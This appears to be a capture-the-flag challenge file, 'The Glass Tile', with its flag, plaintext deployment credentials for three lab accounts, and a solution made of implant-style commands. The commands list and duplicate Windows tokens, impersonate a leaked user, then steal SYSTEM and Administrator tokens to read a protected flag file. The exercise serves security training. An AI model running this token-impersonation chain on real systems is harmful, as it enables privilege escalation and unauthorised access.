# Challenge 03 - The Glass Tile

- Main Flag: `squid-game{R3m3mb3r2Ch3ckT0k3ns}`

## Description

Congratulations players!

If you have made it this far it means that you have given your all in the games. Welcome to the last challenge: **"The Glass Tile"**, the rules of the game are:

- There are no advantages or disadvantages in this game. You might think that it is a matter of "chance", but no... the only thing that matters here is effort and dedication.
- You may be tempted to use the same strategy as in the previous games. It might work for you... or it might not.
- Remember, one wrong step and... you will be eliminated. Just as in a drill, you must think through what you are going to do next and act accordingly.

To get started visit the following link:

https://challenge-03.makemalware.com

Good luck!

## Deploy

Credentials:
- Administrator: `Squ1dG4meAdminCr3d3nt14l!`
- square: `Squ1dG4meSquar3Cr3d3nt14l!`
- webusr: `Squ1dG4meW3bSrvCr3d3nt14l!`

## Solution

```shell
sysinfo

# Checking we can't execute any commands because AppLocker Policies
execute "whoami"
execute -e C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -- -c Get-Host

# Listing tokens in current process
list_tokens

# Then visit /admin endpoint to trigger a token leak of ".\square" user

# Impersonating ".\square" user
set_token 952
whoami
whoami -g
show_integrity

# Trying to read the flag (access denied)
cd C:/Users/Administrator/Desktop
ls
cat squid-flag.txt

# Searching for winlogon.exe process and duplicate its SYSTEM token
ps
dup_token 1328
list_tokens

# Impersonate SYSTEM and trying to read the flag (access denied again)
set_token 3544
whoami
cat squid-flag.txt

rev2self
whoami

# Searching for an Administrator process and duplicate its token
ps
dup_token 3132
list_tokens
set_token 3132
whoami
ls
cat squid-flag.txt
```